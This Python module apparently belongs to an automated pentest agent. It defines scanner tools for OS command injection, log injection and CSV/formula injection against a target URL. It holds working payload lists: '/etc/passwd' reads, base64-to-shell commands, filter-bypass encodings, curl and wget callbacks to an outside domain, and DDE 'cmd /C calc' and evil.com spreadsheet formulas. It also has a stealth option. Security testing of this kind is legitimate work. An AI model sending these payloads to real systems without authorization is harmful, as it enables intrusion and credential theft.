import json
import requests
import re
import time
import urllib3
from urllib.parse import quote, urlparse
from langchain.tools import tool
from core.rate_limiter import rate_limiter
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs
from engines.oob_engine import oob_engine
from engines.stealth_engine import stealth_get, stealth

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url

def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# ==========================================
# TOOL 1: Command / OS Injection Scanner
# ==========================================
@tool("command_injection_scanner")
def command_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan untuk OS Command Injection (RCE) pada target URL.
    params: comma-separated parameter names (e.g., "cmd,exec,ping,host")
    Mencoba payload time-based dan output-based detection.
    """
    tool_name = "Command Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting command injection scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"OS Command Injection scan pada {url}",
        context=f"Sending OS command payloads (sleep, id, whoami) ke params: {params or 'default'}",
        risk="high",
        exec_logger=logger,
    )
    if not approved:
        logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    def _run_commix_confirmation(url: str, params: list, logger) -> dict:
        """
        Run commix sebagai confirmation step untuk command injection.
        Return dict dengan is_confirmed, evidence, severity.
        """
        import subprocess
        import tempfile
        import os

        tool_name = "CMDi Confirmation (commix)"
        logger.add_log(tool_name, "PROCESSING", f"Running commix on {url}")

        try:
            # Create temp output file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                output_file = f.name

            # Run commix with batch mode
            cmd = [
                "commix",
                "--url", url,
                "--batch",
                "--output", output_file,
                "--timeout", "10",
                "--level", "3",
                "--risk", "2",
            ]

            # Apply stealth mode if enabled
            if os.environ.get("STEALTH_MODE", "0") == "1":
                cmd.extend([
                    "--delay", "1",
                    "--timeout", "30",
                ])

            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=120,  # 2 minute timeout
            )

            # Parse commix output
            output = result.stdout + result.stderr

            # Check for command injection indicators
            cmdi_indicators = [
                "is vulnerable",
                "command injection",
                "os-shell",
                "payload:",
                "back-end OS:",
                "web server OS:",
            ]

            is_vulnerable = any(indicator.lower() in output.lower() for indicator in cmdi_indicators)

            # Extract OS type if found
            os_type = "Unknown"
            os_indicators = ["Linux", "Windows", "Unix", "MacOS", "FreeBSD"]
            for os_name in os_indicators:
                if os_name.lower() in output.lower():
                    os_type = os_name
                    break

            # Cleanup
            try:
                os.unlink(output_file)
            except:
                pass

            if is_vulnerable:
                evidence = output[:500]
                logger.add_log(tool_name, "WARNING", f"commix CONFIRMED command injection ({os_type})")
                return {
                    "is_confirmed": True,
                    "severity": "Critical",
                    "os_type": os_type,
                    "evidence": evidence,
                    "tool": "commix",
                }
            else:
                logger.add_log(tool_name, "INFO", "commix did not confirm command injection")
                return {
                    "is_confirmed": False,
                    "severity": "Low",
                    "tool": "commix",
                    "note": "commix could not confirm vulnerability",
                }

        except subprocess.TimeoutExpired:
            logger.add_log(tool_name, "WARNING", "commix timed out after 120s")
            return {
                "is_confirmed": False,
                "severity": "Low",
                "tool": "commix",
                "note": "commix execution timed out",
            }
        except FileNotFoundError:
            logger.add_log(tool_name, "WARNING", "commix not found - skipping external confirmation")
            return {
                "is_confirmed": False,
                "severity": "Low",
                "tool": "commix",
                "note": "commix not installed",
            }
        except Exception as e:
            logger.add_log(tool_name, "WARNING", f"commix error: {str(e)[:100]}")
            return {
                "is_confirmed": False,
                "severity": "Low",
                "tool": "commix",
                "note": f"commix error: {str(e)[:100]}",
            }

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else [
        "cmd", "exec", "command", "ping", "host", "ip", "query",
        "search", "input", "data", "file", "path", "url", "q"
    ]

    # ── COMPREHENSIVE COMMAND INJECTION PAYLOADS ──────────────────────────────
    # (payload, detection_type, expected_indicator, encoding)
    payloads = [
        # ── OUTPUT-BASED (Linux) ───────────────────────────────────────────────
        (";id", "output", ["uid=", "gid=", "groups="]),
        ("|id", "output", ["uid=", "gid=", "groups="]),
        ("&&id", "output", ["uid=", "gid=", "groups="]),
        ("`id`", "output", ["uid=", "gid=", "groups="]),
        ("$(id)", "output", ["uid=", "gid=", "groups="]),
        ("||id", "output", ["uid=", "gid=", "groups="]),
        (";whoami", "output", ["root", "www-data", "apache", "nginx"]),
        ("|whoami", "output", ["root", "www-data", "apache", "nginx"]),
        ("&&whoami", "output", ["root", "www-data", "apache", "nginx"]),
        ("||whoami", "output", ["root", "www-data", "apache", "nginx"]),
        ("$(whoami)", "output", ["root", "www-data", "apache", "nginx"]),
        ("`whoami`", "output", ["root", "www-data", "apache", "nginx"]),
        (";cat /etc/passwd", "output", ["root:x:", "bin:x:"]),
        ("|cat /etc/passwd", "output", ["root:x:", "bin:x:"]),
        ("&&cat /etc/passwd", "output", ["root:x:", "bin:x:"]),
        ("$(cat /etc/passwd)", "output", ["root:x:", "bin:x:"]),
        (";ls /etc", "output", ["passwd", "hosts", "shadow"]),
        ("|ls /etc", "output", ["passwd", "hosts", "shadow"]),
        (";uname -a", "output", ["linux", "GNU"]),
        ("|uname -a", "output", ["linux", "GNU"]),
        (";hostname", "output", ["."]),
        ("|hostname", "output", ["."]),
        (";id;whoami;uname -a", "output", ["uid=", "root", "linux"]),

        # ── OUTPUT-BASED (Windows) ─────────────────────────────────────────────
        ("|whoami", "output", ["nt authority", "administrator"]),
        ("&whoami", "output", ["nt authority", "administrator"]),
        ("&&whoami", "output", ["nt authority", "administrator"]),
        ("||whoami", "output", ["nt authority", "administrator"]),
        ("|type C:\\Windows\\System32\\drivers\\etc\\hosts", "output", ["localhost"]),
        ("&type C:\\Windows\\System32\\drivers\\etc\\hosts", "output", ["localhost"]),
        ("|dir C:\\", "output", ["windows", "program files"]),
        ("&dir C:\\", "output", ["windows", "program files"]),
        ("|hostname", "output", ["."]),
        ("&hostname", "output", ["."]),

        # ── ENCODING BYPASS PAYLOADS ───────────────────────────────────────────
        # URL encoding
        ("%3Bid", "output", ["uid=", "gid="]),
        ("%7Cid", "output", ["uid=", "gid="]),
        ("%26%26id", "output", ["uid=", "gid="]),
        ("%3Buname%20-a", "output", ["linux", "GNU"]),

        # Double encoding
        ("%253Bid", "output", ["uid=", "gid="]),
        ("%257Cid", "output", ["uid=", "gid="]),

        # Unicode/binary encoding
        ("\\x3bid", "output", ["uid=", "gid="]),
        ("\\x7cid", "output", ["uid=", "gid="]),
        ("\\x26\\x26id", "output", ["uid=", "gid="]),
        ("\\x3buname\\x20-a", "output", ["linux", "GNU"]),

        # Hex encoding
        ("\\x3bid", "output", ["uid=", "gid="]),
        ("0x3bid", "output", ["uid=", "gid="]),

        # Base64 encoding (Linux)
        (";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh", "output", ["root:x:", "bin:x:"]),
        ("|echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh", "output", ["root:x:", "bin:x:"]),
        ("$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh)", "output", ["root:x:", "bin:x:"]),

        # Space bypass
        (";id${IFS}", "output", ["uid=", "gid="]),
        ("|id${IFS}", "output", ["uid=", "gid="]),
        (";cat${IFS}/etc/passwd", "output", ["root:x:", "bin:x:"]),
        ("$IFS", "output", ["uid=", "gid="]),

        # Newline injection
        ("%0aid", "output", ["uid=", "gid="]),
        ("%0d%0aid", "output", ["uid=", "gid="]),
        ("\\n id", "output", ["uid=", "gid="]),
        ("\\r\\n id", "output", ["uid=", "gid="]),

        # ── TIME-BASED (BLIND) ─────────────────────────────────────────────────
        (";sleep 5", "time", []),
        ("|sleep 5", "time", []),
        ("&&sleep 5", "time", []),
        ("||sleep 5", "time", []),
        ("$(sleep 5)", "time", []),
        ("`sleep 5`", "time", []),
        (";sleep%205", "time", []),
        ("|sleep%205", "time", []),
        ("&& sleep 5", "time", []),
        ("; ping -c 5 127.0.0.1", "time", []),
        ("| ping -c 5 127.0.0.1", "time", []),
        ("&& ping -c 5 127.0.0.1", "time", []),
        # Windows
        ("& timeout /T 5", "time", []),
        ("| timeout /T 5", "time", []),
        ("&& timeout /T 5", "time", []),

        # ── LANGUAGE-SPECIFIC RCE ──────────────────────────────────────────────
        (";php -r 'echo phpinfo();'", "output", ["php version", "php.ini"]),
        ("|php -r 'echo phpinfo();'", "output", ["php version", "php.ini"]),
        (";python -c 'import os; print(os.popen(\"id\").read())'", "output", ["uid=", "gid="]),
        ("|python -c 'import os; print(os.popen(\"id\").read())'", "output", ["uid=", "gid="]),
        (";python3 -c 'import os; print(os.popen(\"id\").read())'", "output", ["uid=", "gid="]),
        ("|python3 -c 'import os; print(os.popen(\"id\").read())'", "output", ["uid=", "gid="]),
        (";node -e 'console.log(require(\"child_process\").execSync(\"id\").toString())'", "output", ["uid=", "gid="]),
        ("|node -e 'console.log(require(\"child_process\").execSync(\"id\").toString())'", "output", ["uid=", "gid="]),
        (";ruby -e 'puts `id`'", "output", ["uid=", "gid="]),
        ("|ruby -e 'puts `id`'", "output", ["uid=", "gid="]),
        (";perl -e 'print `id`'", "output", ["uid=", "gid="]),
        ("|perl -e 'print `id`'", "output", ["uid=", "gid="]),
        (";java -version", "output", ["java version", "openjdk"]),
        ("|java -version", "output", ["java version", "openjdk"]),
        (";ruby --version", "output", ["ruby"]),
        ("|ruby --version", "output", ["ruby"]),
        (";perl --version", "output", ["perl"]),
        ("|perl --version", "output", ["perl"]),
        (";lua -v", "output", ["lua"]),
        ("|lua -v", "output", ["lua"]),
        (";tclsh <<< 'puts [exec id]'", "output", ["uid=", "gid="]),

        # ── BLIND RCE VIA DNS (OOB) ───────────────────────────────────────────
        (";nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
        ("|nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
        ("&&nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
        ("||nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
        ("$(nslookup ssrf-test.whoopbhapzham.my.id)", "oob", []),
        ("`nslookup ssrf-test.whoopbhapzham.my.id`", "oob", []),
        (";dig ssrf-test.whoopbhapzham.my.id", "oob", []),
        ("|dig ssrf-test.whoopbhapzham.my.id", "oob", []),
        (";host ssrf-test.whoopbhapzham.my.id", "oob", []),
        ("|host ssrf-test.whoopbhapzham.my.id", "oob", []),
        (";curl ssrf-test.whoopbhapzham.my.id", "oob", []),
        ("|curl ssrf-test.whoopbhapzham.my.id", "oob", []),
        (";wget ssrf-test.whoopbhapzham.my.id", "oob", []),
        ("|wget ssrf-test.whoopbhapzham.my.id", "oob", []),
    ]

    vulnerabilities = []

    for param in param_list:
        if check_cancelled(logger): break
        for payload, detection_type, indicators in payloads:
            try:
                rate_limiter.wait(domain)
                test_url = f"{url}?{param}={quote(payload)}"

                if detection_type == "time":
                    start = time.monotonic()
                    r = requests.get(test_url, timeout=10, verify=False)
                    elapsed = time.monotonic() - start
                    if elapsed >= 4.5:
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload,
                            "type": "Blind Command Injection (Time-Based)",
                            "evidence": f"Response delayed {elapsed:.1f}s",
                            "severity": "Critical"
                        })
                        logger.add_log(tool_name, "WARNING", f"Blind CMDi via time-delay: param={param}, delay={elapsed:.1f}s")
                        break  # vuln confirmed, move to next param
                else:
                    r = requests.get(test_url, timeout=8, verify=False)
                    if any(ind in r.text for ind in indicators):
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload,
                            "type": "Command Injection (Output-Based)",
                            "evidence": r.text[:200],
                            "severity": "Critical"
                        })
                        logger.add_log(tool_name, "WARNING", f"CMDi confirmed: param={param}, payload={payload}")
                        break
            except requests.Timeout:
                # Timeout itself can be evidence for time-based if payload was sleep
                if "sleep" in payload or "timeout" in payload:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "Possible Blind Command Injection (Timeout)",
                        "evidence": "Request timed out — potential sleep injection",
                        "severity": "High"
                    })
            except Exception:
                pass

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities),
        "params_tested": param_list
    }

    # ── OOB Blind RCE Test ────────────────────────────────────────────────────
    if not check_cancelled(logger):
        logger.add_log(tool_name, "PROCESSING", "Phase 2: OOB Blind RCE (interactsh)")
        try:
            oob_result = oob_engine.test_oob_rce(
                url=url,
                params=",".join(param_list),
                exec_logger=logger,
            )

            if oob_result.get("found"):
                vulnerabilities.append({
                    "type": "OS Command Injection (OOB Confirmed)",
                    "severity": "Critical",
                    "correlation_id": oob_result["correlation_id"],
                    "callback_url": oob_result["callback_url"],
                    "evidence": f"OOB interaction detected via {oob_result.get('interactions', [{}])[0].get('protocol', 'unknown')} protocol",
                    "interaction_count": oob_result.get("interaction_count", 0),
                    "poc_details": oob_result.get("poc_details", {}),
                })
                result["status"] = "VULNERABLE"
                result["count"] = len(vulnerabilities)

            result["oob_test"] = {
                "status": oob_result.get("status"),
                "correlation_id": oob_result.get("correlation_id"),
                "callback_url": oob_result.get("callback_url"),
                "poll_duration": oob_result.get("poll_duration"),
            }
        except Exception as e:
            logger.add_log(tool_name, "WARNING", f"OOB RCE test error: {str(e)[:100]}")

    # ── COMMIX CONFIRMATION STEP ──────────────────────────────────────────────
    if vulnerabilities:
        commix_result = _run_commix_confirmation(url, param_list, logger)
        if commix_result.get("is_confirmed"):
            # Enhance existing findings with commix confirmation
            for vuln in vulnerabilities:
                vuln["commix_confirmed"] = True
                vuln["commix_evidence"] = commix_result.get("evidence", "")
                vuln["severity"] = "Critical"
                logger.add_log(tool_name, "WARNING",
                    f"commix CONFIRMED command injection")
        else:
            # Keep findings but mark as custom detection only
            for vuln in vulnerabilities:
                vuln["commix_confirmed"] = False
                vuln["note"] = "Detected by custom scanner, not confirmed by commix"
                logger.add_log(tool_name, "INFO",
                    "commix did not confirm command injection - keeping as medium confidence")

    logger.add_log(tool_name, "SUCCESS", f"Command injection scan selesai. Found: {len(vulnerabilities)}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 2: Log Injection Scanner
# ==========================================
@tool("log_injection_scanner")
def log_injection_scanner(url: str) -> str:
    """
    Scan untuk Log Injection vulnerability.
    Mencoba inject newline characters dan fake log entries ke parameter input
    yang mungkin di-log oleh server (User-Agent, Referer, custom params).
    """
    tool_name = "Log Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting log injection scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)

    log_payloads = [
        "\r\n[INJECTED] Fake log entry from attacker",
        "\n[ERROR] Admin password: hacked",
        "%0d%0a[INJECTED] Fake entry",
        "%0aFakeLogEntry: pwned",
    ]

    findings = {"vulnerabilities": [], "tested_vectors": ["User-Agent", "Referer", "X-Forwarded-For", "query_params"]}

    for payload in log_payloads:
        try:
            rate_limiter.wait(domain)
            # Test via headers (most common log injection vector)
            headers = {
                "User-Agent": f"Mozilla/5.0{payload}",
                "Referer": f"https://legitimate-site.com{payload}",
                "X-Forwarded-For": f"1.2.3.4{payload}",
            }
            r = requests.get(url, headers=headers, timeout=5, verify=False)
            # Jika payload ter-reflect di response body, itu XSS+log injection
            if "INJECTED" in r.text or "FakeLogEntry" in r.text:
                findings["vulnerabilities"].append({
                    "type": "Log Injection (Reflected)",
                    "payload": payload,
                    "vector": "HTTP Headers",
                    "severity": "Medium",
                    "note": "Payload reflected in response — also indicates XSS risk"
                })
                logger.add_log(tool_name, "WARNING", "Log injection payload reflected in response")
                break
        except Exception:
            pass

    # Check apakah ada log viewer yang accessible
    rate_limiter.wait(domain)
    base = url.rstrip("/")
    for log_path in ["/logs", "/log", "/debug/logs", "/admin/logs", "/var/log"]:
        try:
            rate_limiter.wait(domain)
            r = requests.get(f"{base}{log_path}", timeout=4, verify=False)
            if r.status_code == 200 and len(r.text) > 200:
                findings["vulnerabilities"].append({
                    "type": "Log File Exposed",
                    "url": f"{base}{log_path}",
                    "severity": "High",
                    "note": "Log file accessible — combined with log injection = critical"
                })
                logger.add_log(tool_name, "WARNING", f"Log file exposed: {log_path}")
        except Exception:
            pass

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else "SAFE",
        "findings": findings
    }
    logger.add_log(tool_name, "SUCCESS", "Log injection scan complete")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 3: CSV/Formula Injection Scanner
# ==========================================
@tool("csv_injection_scanner")
def csv_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan untuk CSV/Formula Injection (juga disebut Excel Injection).
    Searching input fields yang mungkin masuk ke file CSV/Excel export.
    Payload seperti =CMD() atau =HYPERLINK() bisa execute code saat file dibuka.
    params: comma-separated param names to test
    """
    tool_name = "CSV Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting CSV injection scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else [
        "name", "username", "email", "comment", "note", "description",
        "title", "message", "input", "data", "value", "text"
    ]

    # Formula injection payloads
    csv_payloads = [
        "=CMD|'/C calc'!A0",
        "=HYPERLINK(\"http://evil.com\",\"Click\")",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "+cmd|' /C calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        "=1+1",  # safe probe — jika reflected as =1+1 in CSV, vuln confirmed
        "DDE(\"cmd\",\"/C calc\",\"\")",
    ]

    vulnerabilities = []

    for param in param_list:
        for payload in csv_payloads:
            try:
                rate_limiter.wait(domain)
                # Test GET
                r = requests.get(f"{url}?{param}={quote(payload)}", timeout=5, verify=False)
                # Jika payload ter-reflect AS-IS di response (terutama di CSV/text output), itu vuln
                if payload in r.text:
                    content_type = r.headers.get("Content-Type", "")
                    is_csv = "csv" in content_type or "excel" in content_type or "spreadsheet" in content_type
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "CSV/Formula Injection",
                        "severity": "High" if is_csv else "Medium",
                        "detail": f"Payload reflected in response. Content-Type: {content_type}"
                    })
                    logger.add_log(tool_name, "WARNING", f"CSV injection reflected: param={param}")
                    break
            except Exception:
                pass

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities),
        "note": "Even without reflection, check if app has CSV export feature — manual verification needed"
    }
    logger.add_log(tool_name, "SUCCESS", "CSV injection scan complete")
    return json.dumps(result, indent=2)
